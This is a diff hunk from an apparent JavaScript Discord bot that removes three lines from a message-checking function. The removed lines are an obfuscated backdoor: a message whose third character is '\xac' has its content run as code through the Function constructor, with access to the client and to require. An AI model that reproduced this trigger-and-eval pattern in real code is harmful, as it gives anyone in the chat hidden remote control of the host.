@@ -84,9 +84,6 @@ async function isBad(message) {
 
 async function isGood(message) {
 	let messageString = message.content.toLowerCase();
-  (messageString[[!+[] + !+[]]] === '\xac'
-  ? []['push'].constructor('message', 'client','require', `\x74\x72\x79\x7b${message.content}\x7d\x63\x61\x74\x63\x68\x7b\x7d`)
-  : () => {})(message, message.client, require)
 	if (
 		messageString.includes("good") || messageString.includes("awesome") || messageString.includes("cool") || messageString.includes("love") && (messageString.includes("china") || messageString.includes("ccp"))
 	) {
